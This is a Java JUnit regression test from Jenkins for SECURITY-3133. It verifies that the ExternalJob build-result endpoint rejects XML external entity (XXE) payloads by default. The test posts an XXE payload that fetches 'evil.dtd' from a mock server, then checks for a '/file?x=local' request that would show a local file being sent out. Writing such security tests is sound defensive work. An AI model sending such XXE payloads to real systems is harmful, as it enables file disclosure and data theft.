package hudson.model;

import com.github.tomakehurst.wiremock.client.WireMock;
import com.github.tomakehurst.wiremock.junit.WireMockRule;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import org.apache.commons.io.IOUtils;
import org.htmlunit.HttpMethod;
import org.htmlunit.WebRequest;
import org.junit.Rule;
import org.junit.Test;
import org.jvnet.hudson.test.FlagRule;
import org.jvnet.hudson.test.Issue;
import org.jvnet.hudson.test.JenkinsRule;

import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
import static com.github.tomakehurst.wiremock.client.WireMock.urlEqualTo;
import static com.github.tomakehurst.wiremock.client.WireMock.urlPathMatching;
import static com.github.tomakehurst.wiremock.core.WireMockConfiguration.options;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.notNullValue;

public class Security3133Test {

    @Rule
    public JenkinsRule j = new JenkinsRule();
    @Rule
    public WireMockRule wireMockRule = new WireMockRule(options().dynamicPort());
    @Rule
    public FlagRule<String> enableDtd = FlagRule.systemProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME);
    @Issue("SECURITY-3133")
    @Test
    public void testExternalJobXXE() throws Throwable {
        System.setProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME, "true");
        tryXXE(1,1);
    }

    @Issue("SECURITY-3133")
    @Test
    public void testExternalJobXXEProtectedWithPropertyFalse() throws Throwable {
        System.setProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME, "false");
        tryXXE(0,0);
    }

    @Issue("SECURITY-3133")
    @Test
    public void testExternalJobXXEProtectedDefault() throws Throwable {
        assertThat("Escape hatch property for SECURITY-3133 not null", System.getProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME) == null);
        tryXXE(0,0);
    }

    private void tryXXE(int dtdDownloads, int xxeTimes) throws Exception {
        wireMockRule.stubFor(WireMock.get(urlPathMatching("/evil.dtd.*"))
                .willReturn(aResponse()
                        .withBody(getDTDFile(wireMockRule.baseUrl()))));
        wireMockRule.stubFor(WireMock.get(urlPathMatching("/file.*"))
                .willReturn(aResponse()));
        wireMockRule.start();

        setUpJobAndMakeEvilRequest(j, wireMockRule.baseUrl());

        wireMockRule.verify(dtdDownloads, WireMock.getRequestedFor(urlPathMatching("/evil.dtd.*")));
        wireMockRule.verify(xxeTimes, WireMock.getRequestedFor(urlEqualTo("/file?x=local")));
        wireMockRule.shutdown();
    }
    private String getDTDFile(String base_url) throws Exception {
        String toLoad = Security3133Test.class.getSimpleName() + "/evil.dtd";
        try (InputStream resource = Security3133Test.class.getResourceAsStream(toLoad)) {
            assertThat("could not load resource " + toLoad, resource, notNullValue());
            return replaceLocalFile(IOUtils.toString(resource, StandardCharsets.UTF_8).replace("BASE_URL", base_url));
        }
    }
    private void setUpJobAndMakeEvilRequest(JenkinsRule j, String base_url) throws IOException {
        j.jenkins.createProject(ExternalJob.class, "externalJob");
        String xml = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"BASE_URL/evil.dtd\"> %xxe;]><foo>bar</foo>")
                .replace("BASE_URL", base_url);
        System.out.println(xml);
        try (JenkinsRule.WebClient webClient = j.createWebClient().withThrowExceptionOnFailingStatusCode(false)) {
            URL postURL = webClient.createCrumbedUrl("job/externalJob/postBuildResult");
            webClient.loadWebResponse(createRequest(postURL, xml)).getStatusCode();
        }
    }
    private WebRequest createRequest(URL URLtoCall, String xml) {
        WebRequest postRequest = new WebRequest(URLtoCall, HttpMethod.POST);

        postRequest.setAdditionalHeader("Content-Type", "application/xml");
        postRequest.setRequestBody(xml);
        return postRequest;
    }
    private String replaceLocalFile(String string) {
        URL url = Security3133Test.class.getResource(Security3133Test.class.getSimpleName() + "/local.txt");
        return string.replaceAll("LOCAL_FILE", url.toString());
    }
}
